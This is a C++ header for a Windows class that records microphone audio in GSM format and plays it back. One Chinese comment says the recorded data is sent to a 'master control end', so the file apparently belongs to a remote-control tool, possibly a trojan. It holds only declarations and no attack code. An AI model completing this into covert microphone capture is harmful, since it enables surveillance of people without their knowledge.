#pragma once
#include <windows.h>
#include <mmeapi.h>
#include <MMSYSTEM.H>
#include <MMReg.h>
#pragma comment(lib,"Winmm.lib")

class CAudio
{
public:
	CAudio();
	~CAudio();
	BOOL PlayRecordData(LPBYTE BufferData, DWORD BufferLength);
	BOOL OnInitWaveOut();
	LPBYTE GetRecordData(LPDWORD BufferLength);
	BOOL OnInitWaveIn();
	static DWORD WINAPI WaveInProcedure(LPVOID ParameterData);   //发送到主控端
private:
	BOOL   m_IsWaveInUsed;
	BOOL   m_IsWaveOutUsed;
	HANDLE m_WaveInThreadHandle;
	//音频标准
	GSM610WAVEFORMAT m_GSM610WaveFormat;
	ULONG     m_BufferLength;       //两个U盘的大小
	LPWAVEHDR m_InAudioHeader[2];   //两个U盘头信息
	LPBYTE    m_InAudioData[2];     //两个真正的U盘


	LPWAVEHDR m_OutAudioHeader[2];   //两个头
	LPBYTE    m_OutAudioData[2];     //两个数据   保持声音的连续

	HWAVEIN   m_WaveInHandle;        //录音设备句柄 
	ULONG     m_WaveInIndex;

	HWAVEOUT  m_WaveOutHandle;
	ULONG     m_WaveOutIndex;

	HANDLE	  m_EventHandle1;
	HANDLE	  m_EventHandle2;       //两个事件
};

